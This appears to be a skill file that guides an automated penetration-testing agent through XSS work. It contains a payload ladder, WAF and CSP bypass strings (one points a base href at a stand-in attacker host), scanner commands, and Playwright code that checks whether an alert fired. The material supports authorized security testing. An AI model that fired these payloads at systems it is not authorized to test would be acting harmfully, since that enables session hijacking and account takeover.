---
name: xss
description: XSS discovery, exploitation, WAF bypass, and Playwright validation
applicable_contexts: [web, api, frontend]
---

## XSS Testing Methodology

### Types to Test

1. **Reflected XSS** — in URL params, headers, error messages, search results
2. **Stored XSS** — in user inputs persisted and displayed to others (comments, profiles, messages)
3. **DOM-based XSS** — in JS that writes to DOM without sanitization (innerHTML, document.write, eval)

### Payload Progression

| Level | Context | Payload |
|-------|---------|---------|
| 1 | Basic HTML | `<script>alert(1)</script>` |
| 2 | img handler | `<img src=x onerror=alert(1)>` |
| 3 | Attribute | `" onmouseover="alert(1)` |
| 4 | JS context | `';alert(1)//` |
| 5 | SVG | `<svg/onload=alert(1)>` |
| 6 | WAF bypass | `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| 7 | Event | `<details open ontoggle=alert(1)>` |
| 8 | Template | `{{constructor.constructor('alert(1)')()}}` |

### Discovery Tools

```bash
# dalfox — fast XSS scanner
dalfox url "TARGET_URL?param=FUZZ" --output /workspace/dalfox.json --format json

# dalfox with auth
dalfox url "TARGET_URL" -H "Authorization: Bearer TOKEN" \
  --cookie "session=VALUE" --output /workspace/dalfox-auth.json

# ffuf — XSS parameter fuzzing
ffuf -u "TARGET_URL?FUZZ=<script>alert(1)</script>" \
  -w /usr/share/wordlists/params.txt -fs 0 -mc 200

# nuclei — XSS templates
nuclei -u TARGET_URL -t ~/nuclei-templates/vulnerabilities/xss/ \
  -severity critical,high -json -o /workspace/nuclei-xss.json
```

### DOM-Based XSS Detection

Look for dangerous sinks in JavaScript:
- `document.write()`, `document.writeln()`
- `element.innerHTML`, `element.outerHTML`
- `eval()`, `setTimeout(string)`, `setInterval(string)`
- `location.href`, `location.assign()`, `location.replace()`
- `jQuery.html()`, `jQuery.append()`, `jQuery()` with user input

Sources to trace:
- `location.hash`, `location.search`, `location.href`
- `document.referrer`, `document.cookie`
- `window.name`, `postMessage` data

### WAF/Filter Bypass Techniques

- Case variation: `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>`
- Encoding: HTML entities `&#x3C;script&#x3E;`, URL encoding, Unicode
- No-quote payloads: `<img src=x onerror=alert(1)>`
- Tag alternatives: `<svg>`, `<math>`, `<details>`, `<marquee>`, `<body>`
- Event alternatives: `onfocus`, `onblur`, `oninput`, `onanimationend`
- Protocol handlers: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
- CSP bypass: `<base href="https://attacker.com">`, JSONP endpoints, CDN libraries

### Playwright Validation

```python
from playwright.sync_api import sync_playwright

def validate_xss(url: str) -> bool:
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        alerts = []
        page.on("dialog", lambda d: (alerts.append(d.message), d.dismiss()))
        page.goto(url)
        page.wait_for_timeout(3000)
        if alerts:
            page.screenshot(path=f"/workspace/xss_proof.png")
            browser.close()
            return True
        browser.close()
        return False
```

### Stored XSS Attack Chain

1. Identify persistent user input (comments, profiles, descriptions, filenames)
2. Inject payload that executes on VIEW, not just on input page
3. Validate: log in as different user, visit page with stored content
4. Confirm alert/callback fires in victim's browser context
5. Document: injection point, rendering page, impact scope (all users vs specific)

### Business Impact

- Session hijacking via `document.cookie` exfiltration
- Credential theft through fake login forms
- Keylogging on sensitive pages
- Cryptocurrency mining / drive-by downloads
- Worm propagation (self-replicating stored XSS)
- Account takeover chaining with CSRF
